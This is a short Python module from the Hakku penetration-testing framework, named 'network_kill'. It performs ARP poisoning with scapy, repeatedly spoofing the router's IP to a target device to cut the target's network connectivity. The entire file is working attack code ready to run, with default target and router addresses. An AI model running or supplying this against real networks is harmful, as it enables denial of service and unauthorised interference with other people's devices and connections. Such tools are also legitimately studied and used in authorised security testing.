# Copyright (C) 2015 – 2021 Noa-Emil Nissinen (4shadoww)

from core.hakkuframework import *
import os
import signal
from time import sleep
import logging
import scapy.all as scapy
from core import colors

conf = {
    "name": "network_kill",
    "version": "1.0",
    "shortdesc": "blocks communication between router and target",
    "author": "4shadoww",
    "github": "4shadoww",
    "email": "4shadoww0@gmail.com",
    "initdate": "2016-02-24",
    "lastmod": "2021-07-11",
    "apisupport": False,
    "needroot": 1
}

# List of variables
variables = OrderedDict((
    ('target', ['192.168.1.2', "target device's ip"]),
    ('router', ['192.168.1.1', "router's ip"]),
))

# Additional help notes
help_notes = colors.red+"this module will not work without root permission!\n this doesn't work if target refuses from arp request!"+colors.end

#simple changelog
changelog = "Version 1.0:\nrelease"

def run():
    print_info("arp poisoning has been started!")
    print_info("[*] ctrl + c to end")
    packet = scapy.ARP()
    packet.psrc = variables['router'][0]
    packet.pdst = variables['target'][0]
    while 1:
        scapy.send(packet, verbose=False)
        sleep(10)
